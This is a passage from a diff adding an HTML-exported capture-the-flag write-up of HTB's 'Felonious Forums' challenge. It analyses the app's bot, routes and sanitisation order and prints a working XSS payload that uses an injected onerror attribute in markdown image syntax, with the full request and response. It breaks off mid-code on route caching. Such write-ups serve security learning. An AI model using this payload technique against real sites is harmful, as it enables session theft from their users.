@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Felonious Forums.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="felonious-forums-medium-difficulty">Felonious Forums (Medium difficulty)</h1>
+<p>This was a Medium difficulty challenge from the Dirty Money CTF held by HTB from Friday June 15th 2022 through Sunday June 17th 2022.</p>
+<h2 id="description">Description</h2>
+<blockquote>
+<p>Our threat intelligence has traced a reseller of the GrandMonty Ransomware linked with the Monkey Business group to this illegal forums platform. We need you to investigate the platform to find any security loopholes that can provide us access to the platform.</p>
+</blockquote>
+<h2 id="setup">Setup</h2>
+<p>For this challenge we are given the source code of the application including docker file and build instructions so it can be executed locally. The whole structure of the project is the following:</p>
+<pre class="hljs"><code><div>├── Dockerfile
+├── build-docker.sh
+├── challenge
+│   ├── bot.js
+│   ├── database.js
+│   ├── helpers
+│   │   ├── JWTHelper.js
+│   │   └── MDHelper.js
+│   ├── index.js
+│   ├── middleware
+│   │   └── AuthMiddleware.js
+│   ├── package-lock.json
+│   ├── package.json
+│   ├── routes
+│   │   └── index.js
+│   ├── static
+│   │   ├── css
+│   │   │   ├── auth.css
+│   │   │   ├── bootstrap.min.css
+│   │   │   ├── easymde.min.css
+│   │   │   ├── font-awesome.css
+│   │   │   ├── global.css
+│   │   │   ├── main.css
+│   │   │   └── single.css
+│   │   ├── images
+│   │   │   ├── ANDCerberus.webp
+│   │   │   ├── admin.png
+│   │   │   ├── ads_1.gif
+│   │   │   ├── ads_2.gif
+│   │   │   ├── ads_3.gif
+│   │   │   ├── aquaman.webp
+│   │   │   ├── banner.png
+│   │   │   ├── banner1.png
+│   │   │   ├── bg.jpeg
+│   │   │   ├── bg.jpg
+│   │   │   ├── fbi.png
+│   │   │   ├── gifs
+│   │   │   │   ├── drive.gif
+│   │   │   │   ├── gib.png
+│   │   │   │   ├── king.gif
+│   │   │   │   ├── monkas.png
+│   │   │   │   ├── pepejail.gif
+│   │   │   │   ├── police.png
+│   │   │   │   └── sleepingpepe.png
+│   │   │   ├── hecker.webp
+│   │   │   ├── leaker.jpg
+│   │   │   ├── logo.png
+│   │   │   ├── logo_large.png
+│   │   │   ├── monty.png
+│   │   │   ├── newbie.webp
+│   │   │   ├── reseller.jpg
+│   │   │   ├── zoidberg.webp
+│   │   │   └── zoldyck.webp
+│   │   ├── js
+│   │   │   ├── auth.js
+│   │   │   ├── bootstrap.min.js
+│   │   │   ├── easymde.min.js
+│   │   │   ├── global.js
+│   │   │   └── jquery-3.6.0.min.js
+│   │   └── vendors
+│   │       └── mdi
+│   │           ├── fonts
+│   │           │   ├── materialdesignicons-webfont.eot
+│   │           │   ├── materialdesignicons-webfont.ttf
+│   │           │   ├── materialdesignicons-webfont.woff
+│   │           │   └── materialdesignicons-webfont.woff2
+│   │           └── materialdesignicons.min.css
+│   └── views
+│       ├── home.html
+│       ├── login.html
+│       ├── new-thread.html
+│       ├── preview-thread.html
+│       ├── register.html
+│       ├── report.html
+│       └── thread.html
+├── config
+│   └── supervisord.conf
+└── flag.txt
+</div></code></pre>
+<p>The project comes with instructions to build and execute:</p>
+<pre class="hljs"><code><div><span class="hljs-meta">#!/bin/bash</span>
+docker rm -f web_felonious_forums
+docker build -t web_felonious_forums .
+docker run --name=web_felonious_forums --rm -p1337:1337 -it web_felonious_forums
+</div></code></pre>
+<p>I also ran a base scan of the image using snyk (it comes by default with docker now):</p>
+<pre class="hljs"><code><div>docker scan web_felonious_forums
+
+Testing web_felonious_forums...
+
+✗ Low severity vulnerability found <span class="hljs-keyword">in</span> xdg-utils
+  Description: Information Exposure
+  Info: https://snyk.io/vuln/SNYK-DEBIAN10-XDGUTILS-1042780
+  Introduced through: google-chrome-stable@103.0.5060.114-1
+  From: google-chrome-stable@103.0.5060.114-1 &gt; xdg-utils@1.1.3-1+deb10u1
+  Image layer: <span class="hljs-string">'apt-get install -y google-chrome-stable libxss1 libxshmfence-dev --no-install-recommends'</span>
+
+...snip...
+
+✗ High severity vulnerability found <span class="hljs-keyword">in</span> gcc-8/libstdc++6
+  Description: Information Exposure
+  Info: https://snyk.io/vuln/SNYK-DEBIAN10-GCC8-347558
+  Introduced through: gcc-8/libstdc++6@8.3.0-6, apt@1.8.2.3, google-chrome-stable@103.0.5060.114-1, meta-common-packages@meta
+  From: gcc-8/libstdc++6@8.3.0-6
+  From: apt@1.8.2.3 &gt; gcc-8/libstdc++6@8.3.0-6
+  From: apt@1.8.2.3 &gt; apt/libapt-pkg5.0@1.8.2.3 &gt; gcc-8/libstdc++6@8.3.0-6
+  and 4 more...
+  Image layer: <span class="hljs-string">'apt-get install -y google-chrome-stable libxss1 libxshmfence-dev --no-install-recommends'</span>
+
+✗ High severity vulnerability found <span class="hljs-keyword">in</span> curl/libcurl3-gnutls
+  Description: Improper Authentication
+  Info: https://snyk.io/vuln/SNYK-DEBIAN10-CURL-2805484
+  Introduced through: google-chrome-stable@103.0.5060.114-1
+  From: google-chrome-stable@103.0.5060.114-1 &gt; curl/libcurl3-gnutls@7.64.0-4+deb10u2
+  Image layer: <span class="hljs-string">'apt-get install -y google-chrome-stable libxss1 libxshmfence-dev --no-install-recommends'</span>
+
+✗ High severity vulnerability found <span class="hljs-keyword">in</span> curl/libcurl3-gnutls
+  Description: Improper Certificate Validation
+  Info: https://snyk.io/vuln/SNYK-DEBIAN10-CURL-2813757
+  Introduced through: google-chrome-stable@103.0.5060.114-1
+  From: google-chrome-stable@103.0.5060.114-1 &gt; curl/libcurl3-gnutls@7.64.0-4+deb10u2
+  Image layer: <span class="hljs-string">'apt-get install -y google-chrome-stable libxss1 libxshmfence-dev --no-install-recommends'</span>
+
+✗ High severity vulnerability found <span class="hljs-keyword">in</span> curl/libcurl3-gnutls
+  Description: Loop with Unreachable Exit Condition (<span class="hljs-string">'Infinite Loop'</span>)
+  Info: https://snyk.io/vuln/SNYK-DEBIAN10-CURL-2813772
+  Introduced through: google-chrome-stable@103.0.5060.114-1
+  From: google-chrome-stable@103.0.5060.114-1 &gt; curl/libcurl3-gnutls@7.64.0-4+deb10u2
+  Image layer: <span class="hljs-string">'apt-get install -y google-chrome-stable libxss1 libxshmfence-dev --no-install-recommends'</span>
+
+Package manager:   deb
+Project name:      docker-image|web_felonious_forums
+Docker image:      web_felonious_forums
+Platform:          linux/amd64
+Base image:        node:18.6.0-buster-slim
+
+Tested 258 dependencies <span class="hljs-keyword">for</span> known vulnerabilities, found 183 vulnerabilities.
+
+Base Image               Vulnerabilities  Severity
+node:18.6.0-buster-slim  70               0 critical, 1 high, 0 medium, 69 low
+
+Recommendations <span class="hljs-keyword">for</span> base image upgrade:
+
+Alternative image types
+Base Image        Vulnerabilities  Severity
+node:18.6.0-slim  43               0 critical, 0 high, 0 medium, 43 low
+</div></code></pre>
+<p>We get about 183 vulnerabilities, with 4 high risk onesrelated to Google Chrome. Most of these are just dependencies and can be hard to get any direct vulnerabilities out of these, so I'll not look into these ones for now. We'll come back to these if needed.</p>
+<h2 id="objective">Objective</h2>
+<p>Right away you can see that a flag.txt file is included. This file contains an example flag that mirrors the one in the real server, which is the objective:</p>
+<blockquote>
+<p>HTB{f4k3_fl4g_f0r_t3st1ng}</p>
+</blockquote>
+<h2 id="finding-the-flag">Finding the flag</h2>
+<p>Since we are given the source code, I decided to dive right into it and work my way from the flag backwards to see how we can reach it.
+A quick search for the flag file points us to <strong>bot.js</strong></p>
+<pre class="hljs"><code><div>grep -H -R flag.txt .
+./challenge/bot.js:const flag = fs.readFileSync(<span class="hljs-string">'/flag.txt'</span>, <span class="hljs-string">'utf8'</span>);
+./Dockerfile:COPY flag.txt /flag.txt
+</div></code></pre>
+<p>Checking the file, we can see the bot is using Puppeteer and is setting the flag as part of a JWT in it's cookies:</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">let</span> token = <span class="hljs-keyword">await</span> JWTHelper.sign({ <span class="hljs-attr">username</span>: <span class="hljs-string">'moderator'</span>, <span class="hljs-attr">user_role</span>: <span class="hljs-string">'moderator'</span>, <span class="hljs-attr">flag</span>: flag });
+		<span class="hljs-keyword">await</span> page.setCookie({
+			<span class="hljs-attr">name</span>: <span class="hljs-string">"session"</span>,
+			<span class="hljs-string">'value'</span>: token,
+			<span class="hljs-attr">domain</span>: <span class="hljs-string">"127.0.0.1:1337"</span>
+		});
+</div></code></pre>
+<p>It's also important to note the <strong>id</strong> parameter in the <strong>visitPage</strong> function is not being validated/sanitized in any way, and this is used to point the bot to a URL. If this id can be manipulated by the user, then we can make the bot visit any page in the domain (127.0.0.1) via path traversal:</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">await</span> page.goto(<span class="hljs-string">`http://127.0.0.1:1337/report/<span class="hljs-subst">${id}</span>`</span>, {
+			<span class="hljs-attr">waitUntil</span>: <span class="hljs-string">'networkidle2'</span>,
+			<span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span>
+		});
+</div></code></pre>
+<p>Now, we need to know where this <strong>visitPage</strong> function is invoked, and we find that it's invoked in the <strong>routes/index.js</strong> file:</p>
+<pre class="hljs"><code><div>router.post(<span class="hljs-string">'/api/report'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
+	<span class="hljs-keyword">const</span> { post_id } = req.body;
+	<span class="hljs-keyword">if</span> (botVisiting) <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">403</span>).send(response(<span class="hljs-string">'Please wait for the previous report to process first!'</span>));
+	<span class="hljs-keyword">if</span>(post_id) {
+		botVisiting = <span class="hljs-literal">true</span>;
+		<span class="hljs-keyword">return</span> bot.visitPost(post_id)
+			.then(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {
+				botVisiting = <span class="hljs-literal">false</span>;
+				<span class="hljs-keyword">return</span> res.send(response(<span class="hljs-string">'Report received successfully!'</span>));
+			})
+			.catch(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> {
+				<span class="hljs-built_in">console</span>.log(e);
+				botVisiting = <span class="hljs-literal">false</span>;
+				<span class="hljs-keyword">return</span> res.status(<span class="hljs-number">403</span>).send(response(<span class="hljs-string">'Something went wrong, please try again!'</span>));
+			})
+	}
+	<span class="hljs-keyword">return</span> res.status(<span class="hljs-number">500</span>).send(response(<span class="hljs-string">'Missing required parameters!'</span>));
+});
+</div></code></pre>
+<p>POST requests to /api/report result in the bot visiting the page specified by the <strong>post_id</strong> parameter. Again, we see that this parameter is not being validated nor sanitized, so we can manipulati this the have the bot visit other pages. Also worth noticing this route does not require authentication, for whatever reason</p>
+<p>Now we need to know where this report request is sent. We can check the views to see where this gets invoked and we find <strong>./challenge/static/js/global.js</strong>. This file has a function <strong>reportThreadPost</strong> defined which invokes /api/report, and is bound to elements with the <strong>.p-report</strong> class:</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">if</span> ($(<span class="hljs-string">'.p-report'</span>).length) {
+    $(<span class="hljs-string">'.p-report'</span>).on(<span class="hljs-string">'click'</span>, (el) =&gt; {
+        reportThreadPost(el.target.dataset.post_id);
+    });
+}
+</div></code></pre>
+<p>This corresponds to the &quot;REPORT&quot; button on thread pages as can be seen in ./challenge/views/thread.html. Now, this is probably o good time to take a look at the application to make sense of what we're seeing.</p>
+<h2 id="the-application">The application</h2>
+<p><img src="login.png" alt=""></p>
+<p>We first get to the login page, but we don't have to fight our way in, as registration is open to anyone. We just register a user and go in.</p>
+<p><img src="home.png" alt=""></p>
+<p>Most of the stuff is not really usable, but we have access to a few functionalities: reading threads, replying to threads/comments and creating new threads.
+Now, on threads there are 2 interesting parts; one is the report button, and the other one is the box to post replies:</p>
+<p><img src="report_reply.png" alt=""></p>
+<p>What's interesting is that the application is allowing Markdown syntax in comments, which is then transformed to HTML. This is an idicator that we may be looking at XSS as the attack vector to get the bot's cookie. If we can inject javascript somehow in a page ang get the bot to visit, we gan get the flag in it's cookie.</p>
+<h2 id="finding-xss">Finding XSS</h2>
+<p>So, now that we identified a potential attack vector, we need to find if it's actually possible to get XSS in the application. I toyed a bit with the comments, but didn't really find a vulnerable spot, so I went back to the source code. First I checked the route where replies are sent:</p>
+<pre class="hljs"><code><div>router.post(<span class="hljs-string">'/api/threads/reply'</span>, AuthMiddleware, <span class="hljs-keyword">async</span> (req, res) =&gt; {
+	<span class="hljs-keyword">const</span> { id, comment } = req.body;
+	<span class="hljs-keyword">const</span> html_content = makeHTML(comment);
+
+	<span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isNaN</span>(<span class="hljs-built_in">parseInt</span>(id))) {
+		<span class="hljs-keyword">return</span> db.postThreadReply(req.user.id, <span class="hljs-built_in">parseInt</span>(id), filterInput(html_content))
+			.then(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {
+				res.send(response(<span class="hljs-string">'Thread reply posted successfully!'</span>));
+			})
+			.catch(<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
+				res.status(<span class="hljs-number">500</span>).send(response(<span class="hljs-string">'Failed to post thread reply!'</span>));
+			});
+	} <span class="hljs-keyword">else</span> {
+		<span class="hljs-keyword">return</span> res.status(<span class="hljs-number">500</span>).send(response(<span class="hljs-string">'Missing required parameters!'</span>));
+	}
+});
+</div></code></pre>
+<p>The app invokes <strong>makeHTML()</strong> and <strong>filterInput()</strong> to process the input before saving it to the DB. An these ones are defined in <strong>MDHelper.js</strong>:</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">const</span> conv = <span class="hljs-keyword">new</span> showdown.Converter({
+	<span class="hljs-attr">completeHTMLDocument</span>: <span class="hljs-literal">false</span>,
+	<span class="hljs-attr">tables</span>: <span class="hljs-literal">true</span>,
+	<span class="hljs-attr">ghCodeBlocks</span>: <span class="hljs-literal">true</span>,
+	<span class="hljs-attr">simpleLineBreaks</span>: <span class="hljs-literal">true</span>,
+	<span class="hljs-attr">strikethrough</span>: <span class="hljs-literal">true</span>,
+	<span class="hljs-attr">metadata</span>: <span class="hljs-literal">false</span>,
+	<span class="hljs-attr">emoji</span>: <span class="hljs-literal">true</span>
+});
+
+<span class="hljs-keyword">const</span> filterInput = <span class="hljs-function">(<span class="hljs-params">userInput</span>) =&gt;</span> {
+    <span class="hljs-built_in">window</span> = <span class="hljs-keyword">new</span> JSDOM(<span class="hljs-string">''</span>).window;
+    DOMPurify = createDOMPurify(<span class="hljs-built_in">window</span>);
+    <span class="hljs-keyword">return</span> DOMPurify.sanitize(userInput, {<span class="hljs-attr">ALLOWED_TAGS</span>: [<span class="hljs-string">'strong'</span>, <span class="hljs-string">'em'</span>, <span class="hljs-string">'img'</span>, <span class="hljs-string">'a'</span>, <span class="hljs-string">'s'</span>, <span class="hljs-string">'ul'</span>, <span class="hljs-string">'ol'</span>, <span class="hljs-string">'li'</span>]});
+}
+
+<span class="hljs-keyword">const</span> makeHTML = <span class="hljs-function">(<span class="hljs-params">markdown</span>) =&gt;</span> {
+    <span class="hljs-keyword">return</span> conv.makeHtml(markdown);
+}
+</div></code></pre>
+<p>MakeHTML is using Showdown to convert markdown into HTML, and then DOMPurify is used to sanitize the HTML. DOMPurify is a very well tested library and it's unlikely we will find a vulnerability on it, so I checked versions and previosuly reported vulnerabilities, but didn't really find any known vulnerabilities for the used version, which is was up to date at the start of the CTF.
+Seeing tihs, I considered the injection could be somwhere else, like usernames or other inputs that could be manipulated, but the inputs were being consistently HTML escaped. So then I noticed the app is using <strong>nunjucks</strong>, a templating library to autoescape all params in views by default:</p>
+<pre class="hljs"><code><div>nunjucks.configure(<span class="hljs-string">'views'</span>, {
+	<span class="hljs-attr">autoescape</span>: <span class="hljs-literal">true</span>,
+	<span class="hljs-attr">express</span>: app
+});
+</div></code></pre>
+<p>Again, I found no vulnerabilities for the version used of nunjucks. Nunjucks can use a filter named <strong>safe</strong> to define parameters that won't be escaped in views. So we can search places where this filter is being used:</p>
+<pre class="hljs"><code><div>$ grep -H -R <span class="hljs-string">"| safe"</span> .
+./challenge/views/preview-thread.html: {{ content | safe }}
+./challenge/views/report.html:         {{ threadPost.comment | safe }}
+./challenge/views/thread.html:         {{ post.comment | safe }}
+</div></code></pre>
+<p>We can see that the <strong>report</strong> and <strong>thread</strong> views have the safe filter, but also the <strong>preview-thread</strong> view, which we hadn't considered until now. Both report and thread views are reflecting the DOMPurified data, so these are likely not vulnerable, but preview-thread might be:</p>
+<pre class="hljs"><code><div>router.post(<span class="hljs-string">'/threads/preview'</span>, AuthMiddleware, routeCache.cacheSeconds(<span class="hljs-number">30</span>, cacheKey), <span class="hljs-keyword">async</span> (req, res) =&gt; {
+	<span class="hljs-keyword">const</span> {title, content, cat_id} = req.body;
+
+	<span class="hljs-keyword">if</span> (cat_id == <span class="hljs-number">1</span>) {
+		<span class="hljs-keyword">if</span> (req.user.user_role !== <span class="hljs-string">'Administrator'</span>) {
+			<span class="hljs-keyword">return</span> res.status(<span class="hljs-number">403</span>).send(response(<span class="hljs-string">'Not Allowed!'</span>));
+		}
+	}
+
+	category = <span class="hljs-keyword">await</span> db.getCategoryById(<span class="hljs-built_in">parseInt</span>(cat_id));
+	safeContent = makeHTML(filterInput(content));
+
+	<span class="hljs-keyword">return</span> res.render(<span class="hljs-string">'preview-thread.html'</span>, {category, title, <span class="hljs-attr">content</span>:safeContent, <span class="hljs-attr">user</span>:req.user});
+});
+</div></code></pre>
+<p>Here we see something interesting. <strong>filterInput()</strong> and <strong>makeHTML()</strong> are also invoked to get <strong>&quot;safeContent&quot;</strong>, but the order is reveresed. The input is being sanitized and the converted from markup to HTML. If the markdown library can be tricked to escape the tag and inject attributes or HTML directly, then we can get XSS. So then we try this on the thread preview page:</p>
+<h3 id="request">Request</h3>
+<pre class="hljs"><code><div><span class="hljs-keyword">POST</span> <span class="hljs-string">/threads/preview?1658271441355</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 192.168.1.118:1337
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
+<span class="hljs-attribute">Content-Length</span>: 89
+<span class="hljs-attribute">Origin</span>: http://192.168.1.118:1337
+<span class="hljs-attribute">DNT</span>: 1
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Referer</span>: http://192.168.1.118:1337/threads/new
+<span class="hljs-attribute">Cookie</span>: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTEsInVzZXJuYW1lIjoibXl1c2VyIiwicmVwdXRhdGlvbiI6MCwiY3JlZGl0cyI6MTAwLCJ1c2VyX3JvbGUiOiJOZXdiaWUiLCJhdmF0YXIiOiJuZXdiaWUud2VicCIsImpvaW5lZCI6IjIwMjItMDctMTkgMjA6MTI6MzUiLCJpYXQiOjE2NTgyNjk1Mzd9.VavmLYqwPLmxWSx7L13cGLZRCUTKrtwE6zzEdwNotms
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
+
+<span class="sas"><span class="hljs-meta">title</span>=test<span class="hljs-variable">&amp;content</span>=xss_here![](http://non_existent.net/fail<span class="hljs-string">"onerror="</span>alert(123))<span class="hljs-variable">&amp;cat_id</span>=2
+</span></div></code></pre>
+<h3 id="response">Response</h3>
+<pre class="hljs"><code><div>HTTP/1.1 <span class="hljs-number">200</span> OK
+<span class="hljs-attribute">X-Powered-By</span>: Express
+<span class="hljs-attribute">Content-Type</span>: text/html; charset=utf-8
+<span class="hljs-attribute">Content-Length</span>: 7196
+<span class="hljs-attribute">ETag</span>: W/"1c1c-y24c+bXd8snI8YSfrXyIHlzxSVo"
+<span class="hljs-attribute">Date</span>: Tue, 19 Jul 2022 22:58:23 GMT
+<span class="hljs-attribute">Connection</span>: close
+
+<span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
+   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Felonious Forums | Preview Thread<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+...snip...
+            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"_pcon"</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>xss_here<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://non_existent.net/fail"</span><span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert(123)"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+...snip...
+</span></div></code></pre>
+<p><img src="xss_alert.png" alt=""></p>
+<p>So there it is, we have XSS!</p>
+<h2 id="now-what">Now what?</h2>
+<p>So we can get XSS on a page, but it's a POST request and it's not a stored XSS. So haw can we get the bot to make such a request?
+I was stuck here for quite a while, but finally noticed something else. Thinking back, I could have noticed before because when I was testing my XSS injection, I sent a request and then made a different one with a slightly different payload but got the same response from the first payload. At the time I though there was some sort of validation on the payload, like a WAF or something, but what was happening? <strong>CACHING</strong></p>
+<p>This was the last part of the puzzle; you can see that the 2 routes related to previews have some sort of caching enabled:</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">const</span> routeCache = <span class="hljs-built_in">require</span>(<span class="hljs-string">'route-cache'</span>);
+...snip...
+const cacheKey = <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
